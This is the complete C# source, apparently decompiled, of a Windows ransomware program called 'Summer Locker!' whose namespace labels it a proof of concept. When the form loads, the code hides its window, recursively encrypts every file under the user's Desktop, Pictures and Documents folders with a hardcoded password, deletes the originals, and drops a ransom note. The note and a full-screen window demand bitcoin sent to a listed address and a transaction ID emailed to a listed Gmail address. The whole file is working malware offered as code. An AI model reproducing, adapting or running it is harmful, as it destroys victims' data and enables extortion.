using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomwarePOC;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".summer";

	private const string ENCRYPT_PASSWORD = "j5OHKCV7tg9swnN_ThisIsSuperDuperPassword_Zggipz68vzeeaf9_MadeByAliens_LrOf8s3r2a3EH5H";

	private const string BITCOIN_ADDRESS = "3CH7s6TMbDxy6LK5BYkatQoEKjXJNLBQft";

	private const string BITCOIN_RANSOM_AMOUNT = "0.002";

	private const string EMAIL_ADDRESS = "dantebrando1979@Gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo decrypt them send 60$ worth of  bitcoin to BTC address: 3CH7s6TMbDxy6LK5BYkatQoEKjXJNLBQft\nAfter that, email your transaction ID to: dantebrando1979@Gmail.com\n\nThats it! We will answer to your mail with decryption key!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label label2;

	private TextBox txtBitcoinAddress;

	private TextBox txtEmailAddress;

	private Label label3;

	private PictureBox pictureBox1;

	private Label label5;

	private Label label1;

	private Label label4;

	private Label label6;

	private Label label7;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.summer.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)lblCount).set_Text("Your files (count: " + encryptedFileCount + ") have been encrypted!");
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)txtBitcoinAddress).set_Text("3CH7s6TMbDxy6LK5BYkatQoEKjXJNLBQft");
		((Control)txtEmailAddress).set_Text("dantebrando1979@Gmail.com");
		((Control)lblBitcoinAmount).Focus();
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".summer"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "j5OHKCV7tg9swnN_ThisIsSuperDuperPassword_Zggipz68vzeeaf9_MadeByAliens_LrOf8s3r2a3EH5H");
				}
			}
			files = Directory.GetDirectories(sDir);
			for (int i = 0; i < files.Length; i++)
			{
				encryptFolderContents(files[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".summer", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bc: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_03ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f9: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Expected O, but got Unknown
		//IL_0519: Unknown result type (might be due to invalid IL or missing references)
		//IL_0523: Expected O, but got Unknown
		//IL_05ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c4: Expected O, but got Unknown
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0665: Expected O, but got Unknown
		//IL_06fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0706: Expected O, but got Unknown
		//IL_079d: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a7: Expected O, but got Unknown
		//IL_0841: Unknown result type (might be due to invalid IL or missing references)
		//IL_084b: Expected O, but got Unknown
		//IL_09f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09fb: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		label2 = new Label();
		txtBitcoinAddress = new TextBox();
		txtEmailAddress = new TextBox();
		label3 = new Label();
		pictureBox1 = new PictureBox();
		label5 = new Label();
		label1 = new Label();
		label4 = new Label();
		label6 = new Label();
		label7 = new Label();
		label8 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.White);
		((Control)lblCount).set_Location(new Point(12, 425));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(914, 55));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Your files (count: n) have been encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)lblBitcoinAmount).set_Anchor((AnchorStyles)14);
		((Control)lblBitcoinAmount).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblBitcoinAmount).set_ForeColor(Color.White);
		((Control)lblBitcoinAmount).set_Location(new Point(12, 558));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(914, 55));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("Send 60$ worth of bitcoin to this address:");
		lblBitcoinAmount.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_Anchor((AnchorStyles)14);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(12, 663));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(914, 55));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("E-mail your transaction ID to the following address:");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(136, 616));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(677, 44));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)txtEmailAddress).set_Anchor((AnchorStyles)2);
		((Control)txtEmailAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtEmailAddress).set_Location(new Point(136, 721));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((TextBoxBase)txtEmailAddress).set_ReadOnly(true);
		((Control)txtEmailAddress).set_Size(new Size(677, 44));
		((Control)txtEmailAddress).set_TabIndex(4);
		((Control)txtEmailAddress).set_Text("friendly.cyber.criminal@gmail.com");
		txtEmailAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 480));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(914, 87));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("In order to recover your data...");
		label3.set_TextAlign((ContentAlignment)2);
		((Control)pictureBox1).set_Anchor((AnchorStyles)15);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(447, 422));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(6);
		pictureBox1.set_TabStop(false);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Crimson);
		((Control)label5).set_Location(new Point(12, 777));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(914, 71));
		((Control)label5).set_TabIndex(8);
		((Control)label5).set_Text(".");
		label5.set_TextAlign((ContentAlignment)32);
		((Control)label1).set_Anchor((AnchorStyles)14);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(465, 72));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(451, 48));
		((Control)label1).set_TabIndex(9);
		((Control)label1).set_Text("Where can i buy bitcoin:");
		label1.set_TextAlign((ContentAlignment)2);
		((Control)label4).set_Anchor((AnchorStyles)14);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(457, 12));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(459, 48));
		((Control)label4).set_TabIndex(10);
		((Control)label4).set_Text("FAQ");
		label4.set_TextAlign((ContentAlignment)2);
		((Control)label6).set_Anchor((AnchorStyles)14);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.White);
		((Control)label6).set_Location(new Point(475, 120));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(451, 48));
		((Control)label6).set_TabIndex(11);
		((Control)label6).set_Text("You can buy it at coinbase.com");
		label6.set_TextAlign((ContentAlignment)2);
		((Control)label7).set_Anchor((AnchorStyles)14);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(Color.White);
		((Control)label7).set_Location(new Point(475, 238));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(451, 105));
		((Control)label7).set_TabIndex(13);
		((Control)label7).set_Text("You need to trust us to get files back. We will always send you decrypt key if you pay :)");
		label7.set_TextAlign((ContentAlignment)2);
		((Control)label8).set_Anchor((AnchorStyles)14);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(474, 168));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(451, 96));
		((Control)label8).set_TabIndex(12);
		((Control)label8).set_Text("How can i be sure that i will get my files back?");
		label8.set_TextAlign((ContentAlignment)2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DeepSkyBlue);
		((Form)this).set_ClientSize(new Size(938, 857));
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Summer Locker!");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
